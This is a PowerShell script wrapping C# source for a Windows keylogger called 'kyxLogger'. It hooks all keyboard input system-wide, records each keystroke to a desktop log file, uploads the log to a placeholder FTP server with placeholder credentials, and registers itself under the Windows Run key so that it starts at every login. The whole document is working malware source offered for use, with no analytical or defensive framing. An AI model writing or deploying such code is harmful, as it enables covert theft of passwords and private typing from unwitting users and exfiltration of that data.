Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32; // Added for Registry functionality

namespace KL
{
    public static class Program
    {
        private static string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Log.txt");
        private static string ftpAddress = "ftp://yourftpserver.com/upload/Log.txt"; // Set your FTP server address
        private static string ftpUsername = "yourUsername"; // Your FTP username
        private static string ftpPassword = "yourPassword"; // Your FTP password

        private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;

        private static int keysPressedCount = 0;

        public static void Main() 
        {
            InitLog();
            Console.WriteLine("kyxLogger by @xtlab ;)");
                        
            hookId = SetHook(hookProc);
            Application.Run();
            UnhookWindowsHookEx(hookId);
            
            UploadLogToFtp(logFilePath);
            Console.WriteLine("Total keys pressed: " + CountKeysPressed());
            DisplayLogContents();
        }

        private static void InitLog()
        {
            File.WriteAllText(logFilePath, "Key Logger Started: " + DateTime.Now + "\n");
        }

        private static IntPtr SetHook(HookProc hookProc) 
        {
            IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            return SetWindowsHookEx(13, hookProc, moduleHandle, 0);
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)0x0100) 
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                if (key.Length > 1)
                    key = string.Format("[{0}] ", key);
                
                File.AppendAllText(logFilePath, key);
                keysPressedCount++; // Increment count of keys pressed
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }
        
        public static void UploadLogToFtp(string filePath)
        {
            try
            {
                WebClient client = new WebClient();
                client.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
                client.UploadFile(ftpAddress, WebRequestMethods.Ftp.UploadFile, filePath);
                Console.WriteLine("Log uploaded successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error uploading log: " + ex.Message);
            }
        }

        public static int CountKeysPressed()
        {
            return keysPressedCount;
        }

        public static void ClearLog()
        {
            File.WriteAllText(logFilePath, string.Empty);
            Console.WriteLine("Log cleared.");
        }

        public static long GetLogSize()
        {
            FileInfo fileInfo = new FileInfo(logFilePath);
            return fileInfo.Length; // Returns log file size
        }

        public static void DisplayLogContents()
        {
            string contents = File.ReadAllText(logFilePath);
            Console.WriteLine("Log Contents:\n" + contents);
        }

        public static void AddToStartup()
        {
            try
            {
                string appName = "kyxLogger";
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                registryKey.SetValue(appName, exePath);
                Console.WriteLine("Application added to startup.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error adding to startup: " + ex.Message);
            }
        }

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    }
}
"@ -ReferencedAssemblies System.Windows.Forms, System.Net, Microsoft.Win32

[KL.Program]::Main();
[KL.Program]::AddToStartup(); // Call to add to startup
